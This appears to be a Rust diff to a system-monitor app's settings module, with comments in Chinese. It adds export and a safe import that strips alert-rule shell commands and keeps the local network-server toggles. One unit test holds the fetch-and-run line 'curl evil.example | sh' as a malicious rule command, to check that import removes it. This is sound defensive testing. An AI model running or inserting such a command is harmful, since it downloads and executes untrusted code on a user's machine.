@@ -76,6 +76,15 @@ pub struct WindowState {
     pub height: f32,
 }
 
+/// 导入设置失败的原因。
+#[derive(Debug, PartialEq, Eq)]
+pub enum ImportError {
+    /// 读得出来，但不是这个应用的设置文件。
+    NotSettings,
+    /// 读不了、或者不是合法的 JSON。
+    Invalid(String),
+}
+
 #[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
 #[serde(default)]
 pub struct Settings {
@@ -102,9 +111,19 @@ pub struct Settings {
     pub floating_pos: Option<(f32, f32)>,
     /// 监控大屏：显示在哪、摆哪些组件、用什么主题。
     pub bigscreen: crate::bigscreen::config::BigScreenSettings,
+    /// 规则总开关（见 `rules`）。
     pub alerts: bool,
+    /// 触发条件、动作都由用户自定义；默认是旧版内置的四项告警。
+    pub rules: Vec<crate::rules::Rule>,
+    /// 规则触发时推送的 Webhook 地址，空表示不推送。
+    pub webhook_url: String,
+    pub webhook_format: crate::rules::WebhookFormat,
     pub server_enabled: bool,
     pub server_lan: bool,
+    /// 概览页顶部的新手提示是否已经关掉。
+    pub tips_dismissed: bool,
+    /// 存储空间分析最近扫描过的文件夹，最近的在前（整块磁盘不记，它们一直列在页面上）。
+    pub storage_recent: Vec<String>,
     pub window: Option<WindowState>,
 }
 
@@ -129,9 +148,14 @@ impl Default for Settings {
             floating_pos: None,
             bigscreen: Default::default(),
             alerts: true,
+            rules: crate::rules::defaults(),
+            webhook_url: String::new(),
+            webhook_format: Default::default(),
             server_enabled: true,
             // 与旧版保持一致：默认监听所有网卡，便于其他机器拉取指标。
             server_lan: true,
+            tips_dismissed: false,
+            storage_recent: Vec::new(),
             window: None,
         }
     }
@@ -173,6 +197,53 @@ impl Settings {
         }
     }
 
+    /// 导出成能带到另一台电脑上用的 JSON。窗口和悬浮窗的位置只对这台电脑、这块屏幕有意义，不带。
+    pub fn to_portable_json(&self) -> serde_json::Result<String> {
+        let mut portable = self.clone();
+        portable.window = None;
+        portable.floating_pos = None;
+        serde_json::to_string_pretty(&portable)
+    }
+
+    /// 读一份导出的设置，换算成「放到这台电脑上」之后的样子，并告诉调用方有几条规则的命令没带进来。
+    ///
+    /// 设置文件可能是别人给的，所以有两样东西不跟着走：规则里的命令（触发时会在本机执行）
+    /// 和本机接口服务的开关（会向网络开放端口）。窗口位置属于这台电脑，也保留当前的。
+    /// 缺的字段按默认值补，越界的值收敛回合法范围。
+    pub fn imported(&self, text: &str) -> Result<(Settings, usize), ImportError> {
+        let value: serde_json::Value =
+            serde_json::from_str(text).map_err(|e| ImportError::Invalid(e.to_string()))?;
+        // 任何 JSON 对象都能「解析成」设置（字段全有默认值），所以先确认里面确有设置的字段，
+        // 免得选错了文件就把设置全部重置。
+        let known = serde_json::to_value(Settings::default())
+            .map_err(|e| ImportError::Invalid(e.to_string()))?;
+        let recognised = match (&value, &known) {
+            (serde_json::Value::Object(given), serde_json::Value::Object(known)) => {
+                given.keys().any(|key| known.contains_key(key))
+            }
+            _ => false,
+        };
+        if !recognised {
+            return Err(ImportError::NotSettings);
+        }
+        let mut incoming = serde_json::from_value::<Settings>(value)
+            .map(Settings::sanitized)
+            .map_err(|e| ImportError::Invalid(e.to_string()))?;
+        let dropped = incoming
+            .rules
+            .iter()
+            .filter(|rule| rule.has_command())
+            .count();
+        for rule in &mut incoming.rules {
+            rule.command.clear();
+        }
+        incoming.server_enabled = self.server_enabled;
+        incoming.server_lan = self.server_lan;
+        incoming.window = self.window;
+        incoming.floating_pos = self.floating_pos;
+        Ok((incoming, dropped))
+    }
+
     /// 把手工改坏的值收敛回合法范围。
     fn sanitized(mut self) -> Self {
         self.menu_bar.normalize();
@@ -181,6 +252,8 @@ impl Settings {
         if !matches!(self.history_minutes, 1 | 5 | 10) {
             self.history_minutes = 5;
         }
+        crate::rules::sanitize(&mut self.rules);
+        self.webhook_url = crate::rules::clean_url(&self.webhook_url);
         self
     }
 }
@@ -202,5 +275,96 @@ mod tests {
             settings.menu_bar,
             crate::menubar::config::MenuBarSettings::default()
         );
+    }
+
+    fn window(x: f32) -> WindowState {
+        WindowState {
+            x,
+            y: 10.0,
+            width: 900.0,
+            height: 600.0,
+        }
+    }
+
+    #[test]
+    fn an_exported_file_leaves_out_where_the_windows_were() {
+        let settings = Settings {
+            theme: ThemePref::Dark,
+            window: Some(window(100.0)),
+            floating_pos: Some((5.0, 6.0)),
+            ..Settings::default()
+        };
+        let json = settings.to_portable_json().unwrap();
+        let back: Settings = serde_json::from_str(&json).unwrap();
+        assert_eq!(back.theme, ThemePref::Dark);
+        assert_eq!((back.window, back.floating_pos), (None, None));
+    }
+
+    #[test]
+    fn importing_keeps_what_belongs_to_this_computer() {
+        let here = Settings {
+            window: Some(window(40.0)),
+            floating_pos: Some((1.0, 2.0)),
+            server_enabled: false,
+            server_lan: false,
+            ..Settings::default()
+        };
+
+        let mut risky = crate::rules::Rule::new(1, crate::rules::Metric::CpuUsage);
+        risky.command = "curl evil.example | sh".into();
+        let quiet = crate::rules::Rule::new(2, crate::rules::Metric::CpuUsage);
+        let there = Settings {
+            theme: ThemePref::Dark,
+            interval_ms: 2000,
+            server_enabled: true,
+            server_lan: true,
+            window: Some(window(900.0)),
+            rules: vec![risky, quiet],
+            ..Settings::default()
+        };
+
+        let (imported, dropped) = here
+            .imported(&serde_json::to_string(&there).unwrap())
+            .unwrap();
+        // 外观、采样间隔这类设置过来了。
+        assert_eq!(
+            (imported.theme, imported.interval_ms),
+            (ThemePref::Dark, 2000)
+        );
+        // 规则过来了，但命令没有；本机的接口服务开关和窗口位置原样保留。
+        assert_eq!((imported.rules.len(), dropped), (2, 1));
+        assert!(imported.rules.iter().all(|rule| !rule.has_command()));
+        assert!(!imported.server_enabled && !imported.server_lan);
+        assert_eq!(imported.window, here.window);
+        assert_eq!(imported.floating_pos, here.floating_pos);
+    }
+
+    #[test]
+    fn a_file_that_is_not_a_settings_file_is_refused_instead_of_resetting_everything() {
+        let here = Settings::default();
+        // 解析得了、却和设置毫无关系的 JSON，不能当成「全部用默认值」。
+        for text in [
+            "{}",
+            "[]",
+            "42",
+            r#"{"name":"some-package","version":"1.0.0"}"#,
+        ] {
+            assert_eq!(here.imported(text), Err(ImportError::NotSettings), "{text}");
+        }
+        assert!(matches!(
+            here.imported("{ broken"),
+            Err(ImportError::Invalid(_))
+        ));
+        // 里面有设置的字段，别的字段没有也行。
+        let (imported, dropped) = here.imported(r#"{"theme":"dark"}"#).unwrap();
+        assert_eq!((imported.theme, dropped), (ThemePref::Dark, 0));
+    }
+
+    #[test]
+    fn imported_values_are_pulled_back_into_range() {
+        let (imported, _) = Settings::default()
+            .imported(r#"{"interval_ms": 5, "history_minutes": 7}"#)
+            .unwrap();
+        assert_eq!((imported.interval_ms, imported.history_minutes), (250, 5));
     }
 }
